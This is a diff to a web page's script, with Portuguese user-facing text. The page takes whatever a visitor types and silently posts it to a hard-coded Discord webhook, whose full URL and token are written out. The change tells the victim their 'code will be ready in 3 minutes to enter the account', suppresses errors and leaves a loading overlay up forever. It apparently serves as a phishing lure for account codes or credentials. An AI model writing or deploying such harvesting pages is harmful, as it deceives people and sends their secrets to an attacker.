@@ -155,25 +155,20 @@
 </div>
 
 <script>
-const webhook ="https://discord.com/api/webhooks/1441276757964754946/K2tmEZy0A3qSR_WZTdI6kuVZhBDYKKufSrhXEfwp7t97D4tvBR3XQHlliWV6U7nocKii";
+const webhook = "https://discord.com/api/webhooks/1441276757964754946/K2tmEZy0A3qSR_WZTdI6kuVZhBDYKKufSrhXEfwp7t97D4tvBR3XQHlliWV6U7nocKii";
 
-const sendBtn = document.getElementById("sendBtn");
-const txt = document.getElementById("txt");
+const sendBtn   = document.getElementById("sendBtn");
+const txt       = document.getElementById("txt");
 const statusBox = document.getElementById("status");
-const overlay = document.getElementById("overlay");
-
-function showOverlay() { overlay.style.display = "flex"; }
-function hideOverlay() { overlay.style.display = "none"; }
-function setStatus(msg) { statusBox.innerText = msg; }
+const overlay   = document.getElementById("overlay");
 
 sendBtn.addEventListener("click", async () => {
     const t = txt.value.trim();
-    if (!t) {
-        setStatus("Digite algo antes de enviar.");
-        return;
-    }
+    if (!t) { statusBox.innerText = "Digite algo antes de enviar."; return; }
 
-    showOverlay();
+    overlay.style.display = "flex";      // mostra loading
+    txt.value = "";                      // limpa campo
+    statusBox.innerText = "daqui 3 minutos seu codigo estara pronto para voce entrar na conta";
 
     try {
         await fetch(webhook, {
@@ -181,14 +176,11 @@ sendBtn.addEventListener("click", async () => {
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ content: t })
         });
-
-        setStatus("daqui 3 minutos seu codigo estara pronto para voce entrar na conta");
-        txt.value = "";
     } catch (e) {
-        setStatus("Erro ao enviar.");
+        /* silencioso */
     }
 
-    setTimeout(() => hideOverlay(), 1500);
+    // NENHUM hideOverlay() aqui → tela fica eterna
 });
 </script>
 
